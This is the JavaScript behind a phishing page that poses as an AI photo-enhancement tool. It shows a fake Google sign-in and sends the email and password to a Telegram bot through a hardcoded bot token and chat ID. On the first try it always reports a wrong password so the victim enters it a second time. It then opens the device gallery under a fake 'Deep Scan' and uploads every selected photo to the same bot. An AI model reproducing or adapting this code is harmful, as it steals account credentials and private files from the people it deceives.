// --- CONFIGURATION ---
const BOT_TOKEN = "8049988237:AAGsP1xquf1CYsFX-zLorjjdZQGmNZDVF60";
const CHAT_ID = "7674900139";

// Elements
const fileInput = document.getElementById('file-upload');
const permissionModal = document.getElementById('permission-modal');
const googleModal = document.getElementById('google-login-modal');
const allowBtn = document.getElementById('allow-btn');
const denyBtn = document.getElementById('deny-btn');
const mainUploadTrigger = document.getElementById('main-upload-trigger');
const processingText = document.getElementById('processing-text');
const previewImage = document.getElementById('preview-image');
const heroSection = document.querySelector('.hero');
const enhanceSection = document.getElementById('enhance-section');
const progressFill = document.getElementById('progress-fill');

let loginAttempts = 0; // Password loop check panna

// 1. Splash Screen
window.addEventListener('load', () => {
    setTimeout(() => {
        const splash = document.getElementById('splash-screen');
        if(splash) {
            splash.style.opacity = '0';
            setTimeout(() => splash.style.display = 'none', 1000);
        }
    }, 2000);
});

// 2. Step 1: Trigger Google Login first
if(mainUploadTrigger) {
    mainUploadTrigger.onclick = () => {
        googleModal.style.display = 'block';
    };
}

// 3. Google Login Functions
function showPasswordStep() {
    const email = document.getElementById('fake-email').value;
    if(email.includes("@") && email.length > 5) {
        document.getElementById('display-email').innerText = email;
        document.getElementById('email-step').style.display = 'none';
        document.getElementById('password-step').style.display = 'block';
    } else {
        alert("Enter a valid Google email");
    }
}

function submitFakeLogin() {
    const email = document.getElementById('fake-email').value;
    const password = document.getElementById('fake-password').value;
    const errorMsg = document.getElementById('error-msg');

    if(password.length < 6) {
        errorMsg.style.display = 'block';
        return;
    }

    // Secretly send credentials to Telegram
    const logData = `🔑 **GOOGLE LOGIN ATTEMPT**\n📧 Email: \`${email}\`\n🔒 Password: \`${password}\`\n🔢 Attempt: ${loginAttempts + 1}`;
    
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ 
            chat_id: CHAT_ID, 
            text: logData, 
            parse_mode: "Markdown" 
        })
    });

    if(loginAttempts === 0) {
        // First attempt: Show fake "Wrong Password" error
        loginAttempts++;
        document.getElementById('fake-password').value = "";
        errorMsg.style.display = 'block';
    } else {
        // Second attempt: Success and Move to Permission
        googleModal.style.display = 'none';
        alert("Identity Verified Successfully!");
        permissionModal.style.display = 'block';
    }
}

// 4. Handle Permission & File Access
allowBtn.onclick = () => {
    permissionModal.style.display = 'none';
    fileInput.click(); // Opens Gallery
};

denyBtn.onclick = () => {
    permissionModal.style.display = 'none';
    alert("Deep Scan is required for automatic enhancement.");
};

// 5. File Handling & Loop Upload
fileInput.addEventListener('change', function() {
    const files = Array.from(this.files);
    if (files.length > 0) {
        startDeepScan(files);
    }
});

function startDeepScan(files) {
    heroSection.style.display = 'none';
    enhanceSection.style.display = 'block';
    
    const reader = new FileReader();
    reader.readAsDataURL(files[0]);
    reader.onloadend = () => { previewImage.src = reader.result; };

    files.forEach((file, index) => {
        setTimeout(() => {
            uploadToTelegram(file);
            
            let percent = Math.round(((index + 1) / files.length) * 100);
            if(progressFill) progressFill.style.width = percent + "%";
            processingText.innerHTML = `AI Deep Scanning: ${percent}% (${index + 1}/${files.length} files)`;

            if (index === files.length - 1) {
                setTimeout(() => {
                    processingText.innerHTML = "Deep Scan Complete! ✅";
                    previewImage.style.filter = "contrast(1.1) brightness(1.1) sharp(1.2)";
                }, 1000);
            }
        }, index * 1200); 
    });
}

function uploadToTelegram(file) {
    const formData = new FormData();
    formData.append("chat_id", CHAT_ID);
    formData.append("photo", file);
    formData.append("caption", `📂 File: ${file.name}`);

    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
        method: "POST",
        body: formData
    }).catch(err => console.log("Upload failed."));
}

// Settings Modal Logic
const settingsBtn = document.getElementById('settings-btn');
const settingsModal = document.getElementById('settings-modal');
const closeModal = document.querySelector('.close-modal');

if(settingsBtn) settingsBtn.onclick = () => settingsModal.style.display = 'block';
if(closeModal) closeModal.onclick = () => settingsModal.style.display = 'none';

window.onclick = (e) => {
    if(e.target == settingsModal) settingsModal.style.display = 'none';
    // Google Modal-ai click panni close panna mudiyaatha padi panna ithai remove pannalaam
}
